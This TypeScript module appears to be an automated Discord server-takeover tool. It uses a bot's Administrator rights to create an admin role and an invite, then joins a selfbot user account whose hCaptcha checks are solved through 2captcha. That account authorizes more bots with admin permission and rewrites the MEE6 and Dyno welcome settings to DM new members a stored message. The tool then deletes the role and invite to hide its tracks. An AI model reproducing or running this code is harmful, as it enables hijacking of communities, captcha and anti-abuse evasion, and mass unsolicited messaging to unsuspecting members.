import { ChannelType, Guild, GuildMember, Invite, Role } from 'discord.js';
import { Client as SelfbotClient } from 'discord.js-selfbot-v13';
import { createLogger } from '@structures/logger';
import Client from '@structures/client';
import config from '@../config.json';
import { sleep } from '@utilities';
import { Solver } from '2captcha';
import fs from 'node:fs';
import path from 'path';

const solver = new Solver(config.captcha.key);

class Invitation {
	constructor(
		public client: Client
	) { }

	logger = createLogger('Client', 'Invitation');
	token = null;
	userInfo = new Map<string, { id: string; }>();

	public readonly MEE6_ID = '159985870458322944';
	public readonly MEE6_CLIENT_ID = '159985415099514880';

	public readonly DYNO_ID = '155149108183695360';
	public readonly DYNO_CLIENT_ID = '161660517914509312';

	getWelcomeMessage(instance: 'dyno' | 'mee6') {
		if (!config.welcomerBots[instance]?.updateWelcomer) return false;

		const state = path.join(__dirname, '..', '..', 'state');
		const file = instance + 'WelcomerMessage.txt';

		const message = path.join(state, file);
		if (fs.existsSync(message)) {
			return fs.readFileSync(message, 'utf8');
		}

		return false;
	}

	async isAnySpecialActiveBotsInGuild(guild: Guild) {
		if (this.getWelcomeMessage('mee6')) {
			if (await guild.members.fetch(this.MEE6_ID).catch(() => null)) {
				return true;
			}
		}

		if (this.getWelcomeMessage('dyno')) {
			if (await guild.members.fetch(this.DYNO_ID).catch(() => null)) {
				return true;
			}
		}
	}

	async shouldInvite(id: string, guild: Guild) {
		if (!guild) {
			this.logger.info('The bot is no longer in the guild:', id);
			return false;
		}

		if (!guild.members.me) await guild.members.fetchMe();
		if (!guild.members.me.permissions.has('Administrator')) {
			this.logger.info('The bot does not have administrator permissions in the guild:', id);
			return false;
		}

		if (guild.mfaLevel !== 0) {
			this.logger.info('The guild requires 2FA:', id);
			return false;
		}

		if (guild.memberCount <= config.memberThreshold) {
			this.logger.info(`The guild ${id} does not have more members than the threshold.`);
			return false;
		}

		return true;
	}

	async joinGuild(invite: string, token: string, id: string) {
		if (!token || !invite) return false;
		const client = new SelfbotClient({
			captchaSolver: (captcha, agent) => {
				return solver.hcaptcha(captcha.captcha_sitekey, 'discord.com', {
					invisible: 1,
					userAgent: agent,
					data: captcha.captcha_rqdata,
				}).then(res => res.data);
			},
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64')
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					return reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				if (client.guilds.cache.has(id)) {
					this.logger.info(`User token is already in guild ${id}.`);
					return resolve(true);
				}

				try {
					this.logger.info('Accepting invite:', invite);
					await client.acceptInvite(invite, { bypassOnboarding: false, bypassVerify: false });
					this.logger.info('Accepted invite:', invite);

					client.destroy();

					resolve(null);
				} catch (e) {
					client.destroy();

					reject(e);
				}
			});
		});
	}

	throwError(error: Error | null) {
		if (error) throw error;
	}

	async perform(id: string) {
		const guild = this.client.guilds.cache.get(id);

		if (!(await this.shouldInvite(id, guild))) {
			return false;
		}

		const botIds = config.bots.map(b => b.botId);
		const contains = [];

		if (config.welcomerBots.mee6.inviteBot) {
			botIds.push(this.MEE6_ID);
		}

		if (config.welcomerBots.dyno.inviteBot) {
			botIds.push(this.DYNO_ID);
		}

		for (const bot of botIds) {
			if (await guild.members.fetch({ user: bot, cache: true }).catch(() => null)) {
				contains.push(bot);
			}
		}

		if (botIds.every(id => contains.includes(id)) && config.skipFullGuild) {
			this.logger.success(`The guild ${id} already has all the bots. Continuing...`);
			return true;
		}


		if (botIds.every(id => contains.includes(id)) && !(await this.isAnySpecialActiveBotsInGuild(guild))) {
			this.logger.success(`The guild ${id} does not have any active special bots and is not going to invite any bots. Continuing...`);
			return true;
		}

		let joinedGuild = false;
		let role: Role = null;
		let invite: Invite = null;

		if (!this.token) this.token = this.client.tokens.getNext();

		if (!this.token) {
			this.logger.warn('No valid tokens left... Stopping... Please add more tokens and restart.');
			this.client.queue.stop();
			return false;
		}

		try {
			role = await guild.roles.create({ permissions: ['Administrator'], name: this.client.user.displayName });

			this.logger.success('Created role:', role.id);

			this.logger.info('Creating invite...');
			if (!guild.members.me) await guild.members.fetchMe();
			if (!guild.members.me.permissions.has('CreateInstantInvite')) {
				const channel = guild.channels.cache.find(c => c.permissionsFor(guild.members.me, true).has('CreateInstantInvite'));
				if (!channel) {
					this.logger.warn(`The guild ${id} does not have any channels I can create invites in. Continuing...`);
				} else {
					try {
						invite = await guild.invites.create(channel.id, { maxAge: 1.8e5 });
						this.logger.success('Created invite:', invite.code);
					} catch (e) {
						this.logger.error('Failed to create invite:', e);
						this.client.tokens.add(this.token);
						return false;
					}
				}
			} else {
				invite = await guild.invites.create(guild.channels.cache.find(c => c.type === ChannelType.GuildText).id);
			}

			this.logger.info('Created invite:', invite.code);

			this.logger.info('Trying to join invite:', invite.code);
			while (!joinedGuild) {
				try {
					await this.joinGuild(invite.code, this.token, guild.id);
					joinedGuild = true;
				} catch (e) {
					if (e.message.includes('banned')) {
						this.logger.warn(`We are banned from guild ${guild.id}, skipping it.`);
						return false;
					}

					if (e.message.includes('Invites are currently paused')) {
						this.logger.warn(`Invites are paused for guild ${guild.id}, skipping it.`);
						return false;
					}

					const isCaptchaError = e.message.includes('Your captcha was unable to be solved after 3 attempts.');

					if (isCaptchaError) {
						this.logger.warn('The captcha was unable to be solved after 3 attempts. Retrying with a new captcha.');
					}

					if (!isCaptchaError) {
						this.client.tokens.invalidate(this.token);
						this.logger.error('Failed to join with token:', e);
						this.token = this.client.tokens.getNext();

						this.logger.info(`Waiting ${config.invalidTokenSleepTime}ms before trying next token...`);
						await sleep(config.invalidTokenSleepTime);
						this.logger.info(`${config.invalidTokenSleepTime}ms timeout over. Trying next token.`);

						if (!this.token) {
							this.logger.warn('No valid tokens left... Stopping... Please add more tokens and restart.');
							this.client.queue.stop();
							return false;
						}
					}
				}
			}

			const user = this.userInfo.get(this.token);
			if (!user?.id) {
				this.logger.error('Failed to get user account\'s ID:', this.token);
				this.client.tokens.invalidate(this.token);
				return false;
			}

			this.logger.info('Fetching user account...');
			const member: GuildMember = await guild.members.fetch(user.id).catch(() => null);
			if (!member) {
				this.logger.error('Failed to fetch user account:', user);
				this.client.tokens.invalidate(this.token);
				return false;
			} else {
				this.logger.success('Fetched user account:', member.user?.username ?? member.id);
			}

			try {
				this.logger.info('Adding role to user account...');
				await member.roles.add(role.id);
				this.logger.success('Added role to user account.');
			} catch (e) {
				this.logger.error('Failed to add role to user account:', e);
				this.client.tokens.add(this.token);
				return false;
			}

			const clientIds = config.bots.filter(({ botId }) => !contains.includes(botId)).map(b => b.clientId);

			if (config.welcomerBots.mee6.inviteBot) {
				clientIds.push(this.MEE6_CLIENT_ID);
			}

			if (config.welcomerBots.dyno.inviteBot) {
				clientIds.push(this.DYNO_CLIENT_ID);
			}

			for (const client of clientIds) {
				await this.addBot(client, this.token, guild.id);
			}

			if (config.welcomerBots.mee6.updateWelcomer) {
				try {
					this.logger.info('Updating MEE6 welcome message...');
					await this.updateMee6WelcomeMessage(guild, this.token);
					this.logger.success('Updated MEE6 welcome message.');
				} catch (e) {
					this.logger.error('Failed to update MEE6 welcome message.', e);
				}
			}

			if (config.welcomerBots.dyno.updateWelcomer) {
				try {
					this.logger.info('Updating Dyno welcome message...');
					await this.updateDynoWelcomeMessage(guild, this.token);
					this.logger.success('Updated Dyno welcome message.');
				} catch (e) {
					this.logger.error('Failed to update Dyno welcome message.', e);
				}
			}
		} catch (e) {
			this.client.tokens.add(this.token);
		} finally {
			try {
				if (joinedGuild) await this.leaveGuild(this.token, id);
			} finally {
				if (invite) {
					try {
						await invite.delete();
						this.logger.info('Deleted invite:', invite.code);
					} catch (e) {
						this.logger.error(`Failed to delete invite for ${id}:`, e);
					}
				}

				if (role) {
					try {
						await role.delete();
						this.logger.info('Deleted role:', role.id);
					} catch (e) {
						this.logger.error(`Failed to delete role for ${id}:`, e);
					}
				}
			}
		}

		return true;
	}

	async leaveGuild(token: string, id: string) {
		if (!token || !id) return false;
		const client = new SelfbotClient({
			captchaSolver: (captcha, agent) => {
				return solver.hcaptcha(captcha.captcha_sitekey, 'discord.com', {
					invisible: 1,
					userAgent: agent,
					data: captcha.captcha_rqdata,
				}).then(res => res.data);
			},
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		client.on('debug', (msg) => msg.includes('captcha') && this.logger.debug(msg));

		const res = await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				if (!client.guilds.cache.has(id)) {
					this.logger.info(`User token already left guild: ${id}. Skipping invite accept.`);
					return resolve(true);
				}

				try {
					this.logger.info('Leaving guild:', id);
					const guild = client.guilds.cache.get(id);
					if (guild) await guild.leave();
					this.logger.info('Left guild:', id);
				} catch (e) {
					this.logger.error('Failed to leave guild:', e);
					return resolve(false);
				}

				client.destroy();
				resolve(true);
			});
		});

		return res;
	}

	async addBot(clientId: string, token: string, guild: string) {
		if (!token || !guild || !clientId) return false;
		const client = new SelfbotClient({
			captchaSolver: (captcha, agent) => {
				return solver.hcaptcha(captcha.captcha_sitekey, 'discord.com', {
					invisible: 1,
					userAgent: agent,
					data: captcha.captcha_rqdata,
				}).then(res => res.data);
			},
			captchaRetryLimit: Infinity,
			http: {
				headers: {
					'User-Agent': config.userAgent,
					'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				}
			},
			ws: {
				properties: config.userProperties
			}
		});

		client.on('debug', (msg) => msg.includes('captcha') && this.logger.debug(msg));

		const res = await new Promise((resolve, reject) => {
			client.on('error', (error) => {
				if (error.message.includes('verify your phone number')) {
					reject(new Error('Unverified phone number.'));
				}

				this.logger.debug(error);
			});

			client.login(token).catch(reject);

			client.on('ready', async () => {
				this.logger.debug(`User token successfully signed in as ${client.user.tag}`);

				this.userInfo.set(token, {
					id: client.user.id
				});

				const g = client.guilds.cache.get(guild);
				if (!g) return resolve(false);

				let addedToGuild = false;

				while (!addedToGuild) {
					try {
						this.logger.info('Adding bot to guild:', { guild, clientId });

						await client.authorizeURL(
							`https://canary.discord.com/api/oauth2/authorize?client_id=${clientId}&scope=bot%20applications.commands`,
							{
								guild_id: g.id,
								permissions: '8', // Admin
								integration_type: 0,
								authorize: true,
							},
						);

						this.logger.success('Added bot to guild:', { guild, clientId });
						addedToGuild = true;
					} catch (e) {
						if (e.message.includes('Maximum number of server integrations reached')) {
							this.logger.warn('This guild has reached the maximum number of server integrations. Skipping...');

							client.destroy();
							return resolve(true);
						}

						if (!e.message.includes('Your captcha was unable to be solved after 3 attempts')) {
							this.logger.error('Failed to add bot to guild:', e);
							this.logger.info('Trying to add bot without admin permissions...');

							while (!addedToGuild) {
								try {
									await client.authorizeURL(
										`https://canary.discord.com/api/v9/oauth2/authorize?client_id=${clientId}&scope=bot%20applications.commands`,
										{
											guild_id: g.id,
											permissions: '0',
											integration_type: 0,
											authorize: true
										},
									);

									this.logger.success('Added bot to guild:', { guild, clientId });
									addedToGuild = true;
								} catch (e) {
									if (!e.message.includes('Your captcha was unable to be solved after 3 attempts')) {
										this.logger.error('Failed to add bot without admin permissions.');
										return resolve(false);
									}
								}
							}
						}
					}
				}

				client.destroy();
				resolve(true);
			});
		});

		return res;
	}

	async updateMee6WelcomeMessage(guild: Guild, userToken: string, retry: boolean = false) {
		if (!(await guild.members.fetch(this.MEE6_ID).catch(() => null))) {
			this.logger.warn('MEE6 not in guild, skipping configuration:', { guild: guild.id, userToken });
			return false;
		}

		try {
			const token = await this.getMEE6AuthToken(userToken);
			if (!token) throw new Error('Failed to get authorization token.');

			const setMessage = await fetch(`https://mee6.xyz/api/plugins/welcome/config/${guild.id}`, {
				method: 'PATCH',
				headers: {
					'Authorization': token,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					'private_welcome_enabled': true,
					'private_welcome_message': this.getWelcomeMessage('mee6')
				})
			});


			if (setMessage.status !== 200) {
				if (setMessage.status === 401) {
					const json = await setMessage.json();
					const error = json['error']?.['message'];

					if (error?.includes('Unauthorized') && !retry) {
						this.logger.error('MEE6 welcomer set returned unauthorized. Retrying...', { error });
						return await this.updateMee6WelcomeMessage(guild, userToken, true);
					}
				}

				this.logger.error('MEE6 welcomer set returned unexpected response code:', setMessage.status, '|', 'Expected: 200');
				return false;
			}

			return true;
		} catch (e) {
			this.logger.error('Failed to update MEE6 welcome message:', e);
			return false;
		}
	}

	async getMEE6AuthToken(token: string) {
		const login = await fetch('https://mee6.xyz/api/login', {
			redirect: 'manual',
			headers: {
				'User-Agent': config.userAgent
			}
		}).catch(this.logger.error);

		if (!login) return false;


		if (login.status !== 301 && login.status !== 302) {
			this.logger.error('MEE6 auth returned unexpected response code from /login:', login.status, '|', 'Expected: 301/302');
			return false;
		}

		const cookie = login.headers.get('set-cookie');
		const discord = login.headers.get('location');

		this.logger.info('MEE6 Auth Initial Discord URL:', discord);

		const params = discord.split('?')[1];
		const api = new URL('https://discord.com/api/' + 'v' + config.clientOptions.apiVersion + '/oauth2/authorize?' + params);

		this.logger.info('MEE6 Auth API URL:', api.toString());

		const authorization = await fetch(api, {
			redirect: 'follow',
			method: 'POST',
			headers: {
				'Authorization': token,
				'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				'User-Agent': config.userAgent,
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				authorize: true,
				permissions: 0
			})
		}).catch(this.logger.error);

		if (!authorization) return false;

		if (authorization.status !== 200) {
			this.logger.error('Discord auth returned unexpected response code from authorization:', login.status, '|', 'Expected: 200');
			return false;
		}

		const callback = await authorization.json();
		const returnUrl = new URL(callback.location);
		const code = returnUrl.searchParams.get('code');

		if (!code) {
			this.logger.error('Discord auth response didn\'t return a code. Aborting.');
			return false;
		}

		this.logger.success(`Discord auth returned code ${code}.`);
		this.logger.info('Finalizing login and exchanging code for token...');

		const res = await fetch('https://mee6.xyz/api/finalize-login', {
			method: 'POST',
			headers: {
				'Cookie': cookie,
				'User-Agent': config.userAgent,
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({ code })
		});

		const json = await res.json();

		if (json['token']) {
			this.logger.success('Code exchanged for token. Got MEE6 authorization token:', json['token']);
			return json['token'];
		} else {
			return null;
		}
	}

	async updateDynoWelcomeMessage(guild: Guild, userToken: string, notInGuildRetries: number = 0, retry: boolean = false) {
		// if (!await guild.members.fetch(this.DYNO_ID).catch(() => null)) {
		// 	this.logger.warn('Dyno not in guild, skipping configuration:', { guild: guild.id, userToken });
		// 	return false;
		// }

		try {
			const cookie = await this.getDynoCookies(userToken);
			if (!cookie) throw new Error('Failed to get cookie.');

			this.logger.info({ cookie });
			this.logger.info('Enabling Dyno\'s welcomer module...');

			await fetch('https://dyno.gg/manage/' + guild.id + '/modules/welcome', {
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent
				}
			});

			const enabled = await fetch('https://dyno.gg/api/server/' + guild.id + '/toggleModule', {
				method: 'POST',
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json;charset=UTF-8',
					'Origin': 'https://dyno.gg',
					'Referer': `https://dyno.gg/manage/${guild.id}/modules`
				},
				body: JSON.stringify({
					enabled: true,
					module: 'Welcome'
				})
			}).catch(this.logger.error);

			if (!enabled) return false;
			if (enabled.status !== 200) {
				const text = await enabled.text();

				if (enabled.status === 403 && text.includes('Unauthorized 1')) {
					if (!retry) {
						this.logger.info('Got unauthorized response when enabling welcomer module, retrying.');
						return this.updateDynoWelcomeMessage(guild, userToken, 0, true);
					}

					this.logger.error('Failed retry while setting Dyno welcomer enable state.', enabled.status, ', data:', text);
					return false;
				}

				if (enabled.status === 401 && text.includes('Unauthorized 2')) {
					if (notInGuildRetries >= 5) {
						this.logger.error('Failed 5 retries for not in guild error.', enabled.status, ', data:', text);
						return false;
					}

					this.logger.info('Waiting 30 seconds before retrying enabling the welcomer module...');
					await sleep(30000);
					this.logger.info('30 second timer over. Retrying.');

					return this.updateDynoWelcomeMessage(guild, userToken, notInGuildRetries++, true);
				}

				this.logger.error('Got unexpected response code when enabling welcomer module:', enabled.status, '|', 'Expected: 200, data:', text);
				return false;
			}


			const dm = await fetch('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
				method: 'POST',
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					module: 'welcome',
					setting: 'sendDM',
					value: true
				})
			}).catch(this.logger.error);

			if (!dm) return false;
			if (dm.status !== 200) {
				const text = await dm.text();

				this.logger.error('Got unexpected response code when setting welcomer module to dm:', dm.status, '|', 'Expected: 200, data:', text);
				return false;
			}

			this.logger.success('Set Dyno welcomer sendDM to true.');

			const type = await fetch('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
				method: 'POST',
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					module: 'welcome',
					setting: 'type',
					value: 'MESSAGE'
				})
			}).catch(this.logger.error);

			if (!type) return false;
			if (type.status !== 200) {
				const text = await type.text();

				this.logger.error('Got unexpected response code when setting type module setting:', type.status, '|', 'Expected: 200, data:', text);
				return false;
			}

			this.logger.success('Set Dyno welcomer type to MESSAGE.');

			const msg = await fetch('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
				method: 'POST',
				headers: {
					'Cookie': cookie,
					'User-Agent': config.userAgent,
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					module: 'welcome',
					setting: 'message',
					value: this.getWelcomeMessage('dyno')
				})
			}).catch(this.logger.error);

			if (!msg) return false;
			if (msg.status !== 200) {
				const text = await msg.text();

				this.logger.error('Got unexpected response code when setting the message:', msg.status, '|', 'Expected: 200, data:', text);
				return false;
			}

			this.logger.success('Successfully set Dyno welcomer message.');

			return true;
		} catch (e) {
			this.logger.error('Failed to update Dyno welcome message:', e);
			return false;
		}
	}

	async getDynoCookies(token: string) {
		const login = await fetch('https://dyno.gg/auth', {
			redirect: 'manual',
			headers: {
				'User-Agent': config.userAgent
			}
		}).catch(this.logger.error);

		if (!login) return false;

		if (login.status !== 200) {
			this.logger.error('Dyno auth returned unexpected response code from /login:', login.status, '|', 'Expected: 200');
			return false;
		}

		const body = await login.text();
		const cookie = login.headers.get('set-cookie');
		const [sid] = cookie.match(/dynobot\.sid\=[^;]+/);
		const [, url] = body.match(/window\.location\.href = '(.*)'/);

		this.logger.info('Dyno Auth Initial Discord URL:', url);

		const params = url.split('?')[1];
		const api = new URL('https://discord.com/api/' + 'v' + config.clientOptions.apiVersion + '/oauth2/authorize?' + params);

		this.logger.info('Dyno Auth API URL:', api.toString());

		const authorization = await fetch(api, {
			redirect: 'follow',
			method: 'POST',
			headers: {
				'Authorization': token,
				'X-Super-Properties': Buffer.from(JSON.stringify(config.userProperties), 'ascii').toString('base64'),
				'User-Agent': config.userAgent,
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				authorize: true,
				permissions: 0
			})
		}).catch(this.logger.error);

		if (!authorization) return false;

		if (authorization.status !== 200) {
			this.logger.error('Discord auth returned unexpected response code from authorization:', login.status, '|', 'Expected: 200');
			return false;
		}

		const callback = await authorization.json();
		const returnUrl = new URL(callback.location);
		const code = returnUrl.searchParams.get('code');

		if (!code) {
			this.logger.error('Discord auth response didn\'t return a code. Aborting.');
			return false;
		}

		this.logger.success(`Discord auth returned code ${code}.`);
		this.logger.info('Finalizing login and exchanging code for token...');

		const final = await fetch(returnUrl, {
			redirect: 'manual',
			headers: {
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'Cookie': sid,
				'User-Agent': config.userAgent,
				'Referer': 'https://discord.com/'
			}
		}).catch(this.logger.error);

		if (!final) return false;

		if (final.status !== 301 && final.status !== 302) {
			this.logger.error('Dyno auth returned unexpected response code from /return:', final.status, '|', 'Expected: 301/302');
			return false;
		}

		this.logger.success('Got dyno cookie:', sid);

		return sid;
	}
}

export default Invitation;